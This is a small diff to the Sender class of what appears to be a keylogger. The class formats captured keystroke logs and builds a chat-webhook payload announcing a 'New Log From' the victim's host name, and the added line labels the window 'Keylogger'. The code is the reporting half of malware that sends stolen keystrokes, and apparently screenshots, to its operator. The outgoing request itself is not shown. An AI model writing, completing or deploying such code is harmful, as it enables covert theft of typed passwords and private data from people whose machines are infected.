@@ -32,6 +32,7 @@ class Sender:
 
 	def send(self, log = '', window = None, image_path = None):
 		log = f'```\n{log}\n```' if log != '' else '```None```'
+		window = 'Keylogger' if window == None else window
 		payload = {"username":"Soix",
 					"avatar_url":"https://i.ibb.co/1GLSqbb/logo.png",
 					"content":f"**New Log From {pc.HostName()}**",
